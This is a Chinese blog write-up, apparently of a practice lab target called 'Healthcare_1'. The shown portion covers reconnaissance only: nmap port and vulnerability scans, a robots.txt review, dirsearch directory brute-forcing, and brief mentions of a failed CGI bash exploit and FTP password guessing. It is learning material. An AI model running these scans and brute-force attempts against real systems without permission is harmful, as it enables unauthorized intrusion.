

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="I3eg1nner">
  <meta name="keywords" content="">
  
    <meta name="description" content="Healthcare_1 靶机信息收集123456789101112┌──(kali㉿kali)-[~&#x2F;Downloads&#x2F;Healthcare]└─$ sudo nmap --min-rate 10000 -p- 192.1.1.141Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-08-09 18:30 EDTNmap scan report f">
<meta property="og:type" content="article">
<meta property="og:title" content="Healthcare_1 靶机">
<meta property="og:url" content="https://i3eg1nner.github.io/2023/08/c7207977b36b.html">
<meta property="og:site_name" content="I3eg1nner&#39;s blog">
<meta property="og:description" content="Healthcare_1 靶机信息收集123456789101112┌──(kali㉿kali)-[~&#x2F;Downloads&#x2F;Healthcare]└─$ sudo nmap --min-rate 10000 -p- 192.1.1.141Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-08-09 18:30 EDTNmap scan report f">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i3eg1nner.github.io/pic/a4601039683d8d46198c9814a6036dbe_MD5.png">
<meta property="og:image" content="https://i3eg1nner.github.io/pic/056df356faeed5a19a59a7aa57c0aee3_MD5.png">
<meta property="og:image" content="https://i3eg1nner.github.io/pic/b2e17b3a33a0ef4bd6d47d7df84327d1_MD5.png">
<meta property="og:image" content="https://i3eg1nner.github.io/pic/74a7ccd8aee5b709ef1824a14aba5448_MD5.png">
<meta property="og:image" content="https://i3eg1nner.github.io/pic/4e93965164248720640c5b226e75f27a_MD5.png">
<meta property="article:published_time" content="2023-08-10T20:01:27.000Z">
<meta property="article:modified_time" content="2023-08-12T17:45:48.737Z">
<meta property="article:author" content="I3eg1nner">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/a4601039683d8d46198c9814a6036dbe_MD5.png">
  
  
  
  <title>Healthcare_1 靶机 - I3eg1nner&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>I3eg1nner</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Healthcare_1 靶机"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-08-11 04:01" pubdate>
          2023年8月11日 凌晨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          28k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          234 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Healthcare_1 靶机</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="Healthcare-1-靶机"><a href="#Healthcare-1-靶机" class="headerlink" title="Healthcare_1 靶机"></a>Healthcare_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.141<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 18:30 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.000064s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>80/tcp open  http<br>MAC Address: 00:0C:29:95:F1:6A (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.09 seconds<br></code></pre></td></tr></table></figure>

<p>只开放了 21 和 80 端口，看看 UDP 扫描的结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ sudo nmap --top-ports 20 -sU 192.1.1.141   <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 13:23 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.00022s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    open|filtered dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   open|filtered msrpc<br>137/udp   open|filtered netbios-ns<br>138/udp   open|filtered netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   open|filtered snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   open|filtered ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  open|filtered nat-t-ike<br>49152/udp open|filtered unknown<br>MAC Address: 00:0C:29:95:F1:6A (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.16 seconds<br></code></pre></td></tr></table></figure>

<p>盯着 21 和 80 端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ sudo nmap -sT -sV -sC -O -p21,80 192.1.1.141<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 18:31 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.00035s latency).<br><br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     ProFTPD 1.3.3d<br>80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS <span class="hljs-number">2011</span>/PREFORK-<span class="hljs-number">1</span>pclos2011))<br>|_http-title: Coming Soon 2<br>| http-robots.txt: 8 disallowed entries <br>| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ <br>|_/all_our_e-mail_addresses /admin/ /<br>|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)<br>MAC Address: 00:0C:29:95:F1:6A (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 2.6.X<br>OS CPE: cpe:/o:linux:linux_kernel:2.6.38<br>OS details: Linux 2.6.38<br>Network Distance: 1 hop<br>Service Info: OS: Unix<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.71 seconds<br><br></code></pre></td></tr></table></figure>

<p>有 <code>robots.txt</code> 文件，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ sudo nmap --script=vuln -p21,80 192.1.1.141 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 18:32 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|   Hosts that seem down (vulnerable):<br>|_    224.0.0.251<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.00018s latency).<br><br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>80/tcp open  http<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server\<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">| http-vuln-cve2011-3192: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Apache byterange filter DoS</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  BID:49303  CVE:CVE-2011-3192</span><br><span class="hljs-string">|       The Apache web server is vulnerable to a denial of service attack when numerous</span><br><span class="hljs-string">|       overlapping byte ranges are requested.</span><br><span class="hljs-string">|     Disclosure date: 2011-08-19</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</span><br><span class="hljs-string">|       https://www.tenable.com/plugins/nessus/55976</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/49303</span><br><span class="hljs-string">|_      https://seclists.org/fulldisclosure/2011/Aug/175</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>| http-fileupload-exploiter: <br>|   <br>|     Couldn\<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|     Couldn\&#x27;</span>t find a file-type field.<br>|   <br>|_    Couldn\<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /robots.txt: Robots file</span><br><span class="hljs-string">MAC Address: 00:0C:29:95:F1:6A (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 354.24 seconds</span><br></code></pre></td></tr></table></figure>

<p>没什么收获，看看 Web 界面的 robots.txt 和 21 ftp 吧</p>
<h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>ftp 拿到了版本信息 <code>ProFTPD 1.3.3d</code>，尝试搜索该版本的漏洞，无收获。尝试匿名登录，失败。尝试查看 Web 服务</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs txt"># $Id: robots.txt 410967 2009-08-06 19:44:54Z oden $<br># $HeadURL: svn+ssh://svn.mandriva.com/svn/packages/cooker/apache-conf/current/SOURCES/robots.txt $<br># exclude help system from robots<br>User-agent: *<br>Disallow: /manual/<br>Disallow: /manual-2.2/<br>Disallow: /addon-modules/<br>Disallow: /doc/<br>Disallow: /images/<br># the next line is a spam bot trap, for grepping the logs. you should _really_ change this to something else...<br>Disallow: /all_our_e-mail_addresses<br># same idea here...<br>Disallow: /admin/<br># but allow htdig to index our doc-tree<br>#User-agent: htdig<br>#Disallow:<br># disallow stress test<br>user-agent: stress-agent<br>Disallow: /<br></code></pre></td></tr></table></figure>

<p>根据 robots.txt 中的注释，似乎使用 <code>User-agent: htdig</code> 的话似乎可以查看索引，并且 <code>/all_our_e-mail_addresses</code> 和 <code>/admin/</code> 是针对爬虫机器人的陷阱</p>
<p>按理说 robots.txt 是君子协定，不知道访问上述目录是否需要特别设置 User-agent ，都尝试一遍得了</p>
<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>目录爆破也同时进行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ sudo dirsearch -u http://192.1.1.141      <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.1.1.141/_23-08-09_18-40-10.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-08-09_18-40-10.<span class="hljs-built_in">log</span><br><br>Target: http://192.1.1.141/<br><br>[18:40:10] Starting: <br>[18:40:10] 301 -  334B  - /js  -&gt;  http://192.1.1.141/js/                  <br>[18:40:11] 403 -  997B  - /.cgi                                            <br>[18:40:12] 403 -  997B  - /.ht_wsr.txt                                     <br>[18:40:12] 403 -  997B  - /.htaccess.orig<br>[18:40:12] 403 -  997B  - /.htaccess.save<br>[18:40:12] 403 -  997B  - /.htaccess.sample<br>[18:40:12] 403 -  997B  - /.htaccess.bak1<br>[18:40:12] 403 -  997B  - /.htaccessOLD<br>[18:40:12] 403 -  997B  - /.htaccessOLD2<br>[18:40:12] 403 -  997B  - /.htaccess_orig<br>[18:40:12] 403 -  997B  - /.htaccessBAK<br>[18:40:12] 403 -  997B  - /.htaccess_sc<br>[18:40:12] 403 -  997B  - /.htaccess_extra                                 <br>[18:40:12] 403 -  997B  - /.html<br>[18:40:12] 403 -  997B  - /.htm<br>[18:40:12] 403 -  997B  - /.httr-oauth                                     <br>[18:40:12] 403 -  997B  - /.htpasswd_test<br>[18:40:12] 403 -  997B  - /.htpasswds                                      <br>[18:40:14] 403 -  997B  - /AT-admin.cgi                                     <br>[18:40:16] 403 -  997B  - /WebShell.cgi                                     <br>[18:40:17] 403 -  997B  - /accounts.cgi                                     <br>[18:40:17] 403 -  997B  - /adm.cgi                                          <br>[18:40:17] 403 -  997B  - /admin.cgi                                        <br>[18:40:22] 403 -  997B  - /apply.cgi                                        <br>[18:40:22] 403 -  997B  - /auth.cgi                                         <br>[18:40:23] 403 -  997B  - /cachemgr.cgi                                     <br>[18:40:23] 403 - 1011B  - /cgi-bin/                                         <br>[18:40:24] 200 -    1KB - /cgi-bin/test.cgi                                 <br>[18:40:25] 301 -  335B  - /css  -&gt;  http://192.1.1.141/css/                 <br>[18:40:26] 403 -  997B  - /dcadmin.cgi                                      <br>[18:40:27] 403 - 1011B  - /error/                                           <br>[18:40:27] 200 -    1KB - /favicon.ico                                      <br>[18:40:28] 301 -  337B  - /fonts  -&gt;  http://192.1.1.141/fonts/             <br>[18:40:28] 403 -  997B  - /hndUnblock.cgi                                   <br>[18:40:29] 301 -  338B  - /images  -&gt;  http://192.1.1.141/images/           <br>[18:40:29] 403 - 1011B  - /images/                                          <br>[18:40:29] 200 -    5KB - /index.html                                       <br>[18:40:29] 200 -    5KB - /index                                            <br>[18:40:30] 403 - 1011B  - /js/                                              <br>[18:40:31] 403 -  997B  - /login.cgi                                        <br>[18:40:32] 403 -  997B  - /members.cgi                                      <br>[18:40:33] 403 -  997B  - /mt-check.cgi                                     <br>[18:40:34] 403 -  997B  - /out.cgi                                          <br>[18:40:34] 403 -  997B  - /perlcmd.cgi                                      <br>[18:40:35] 403 -   59B  - /phpMyAdmin                                       <br>[18:40:36] 403 -   59B  - /phpMyAdmin/                                      <br>[18:40:36] 403 -   59B  - /phpMyAdmin/index.php                             <br>[18:40:36] 403 -   59B  - /phpMyAdmin/scripts/setup.php                     <br>[18:40:36] 403 -   59B  - /phpMyAdmin/phpMyAdmin/index.php<br>[18:40:37] 403 -  997B  - /ps_admin.cgi                                     <br>[18:40:37] 200 -  620B  - /robots.txt                                       <br>[18:40:38] 403 - 1011B  - /server-status/                                   <br>[18:40:38] 403 -  997B  - /server-status                                    <br>[18:40:38] 403 -  997B  - /server-info                                      <br>[18:40:39] 403 -  997B  - /signin.cgi                                       <br>[18:40:43] 403 - 1011B  - /vendor/<br></code></pre></td></tr></table></figure>

<p>真正有用的目录 <code>/cgi-bin/test.cgi</code>，尝试爆破一下 <code>/cgi-bin</code> 目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ sudo dirsearch -u http://192.1.1.141/cgi-bin/ -e cgi,sh<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: cgi, sh | HTTP method: GET | Threads: 30 | Wordlist size: 9515<br><br>Output File: /root/.dirsearch/reports/192.1.1.141/-cgi-bin-_23-08-10_11-15-35.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-08-10_11-15-35.<span class="hljs-built_in">log</span><br><br>Target: http://192.1.1.141/cgi-bin/<br><br>[11:15:35] Starting: <br>[11:15:36] 403 -  997B  - /cgi-bin/.ht_wsr.txt                             <br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccess.sample<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccess.bak1<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccess_extra<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccess.orig<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccessOLD2<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccess_orig<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccess.save<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccessBAK<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccess_sc<br>[11:15:36] 403 -  997B  - /cgi-bin/.htaccessOLD<br>[11:15:36] 403 -  997B  - /cgi-bin/.html                                   <br>[11:15:36] 403 -  997B  - /cgi-bin/.htpasswds<br>[11:15:36] 403 -  997B  - /cgi-bin/.httr-oauth<br>[11:15:36] 403 -  997B  - /cgi-bin/.htpasswd_test<br>[11:15:36] 403 -  997B  - /cgi-bin/.htm<br>[11:16:03] 200 -    1KB - /cgi-bin/test.cgi                                 <br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure>

<p>除了 test.cgi 之外没有别的可访问文件了，加一下 User-agent 再爆破一次</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dirsearch -u http://192.1.1.141 --user-agent=<span class="hljs-string">&quot;User-agent: htdig&quot;</span><br></code></pre></td></tr></table></figure>

<p>没别的结果了。而且 index 页面是 <code>index.html</code></p>
<p>所以这个 User-agent 到底有什么用呢，将 <code>htdig</code> 当字典先存起来吧</p>
<p>网页很简单，倒计时是 script 触发的</p>
<p><img src="/pic/a4601039683d8d46198c9814a6036dbe_MD5.png" srcset="/img/loading.gif" lazyload></p>
<p>小结一下，目前可以感知到的可能的攻击路径：robots.txt 中的目录（虽然都无法访问），<code>test.cgi</code> 文件，21 ftp 端口</p>
<p>尝试搜索 <code>test cgi exploit</code> ，有某些 bash 版本存在漏洞，但是尝试利用失败</p>
<p>尝试对 21 端口进行爆破，使用猜测的用户名 <code>htdig</code>, <code>oden</code> ，爆破失败</p>
<p>在这里卡了很久，没有思路，最后看 WP，发现是爆破字典的问题……</p>
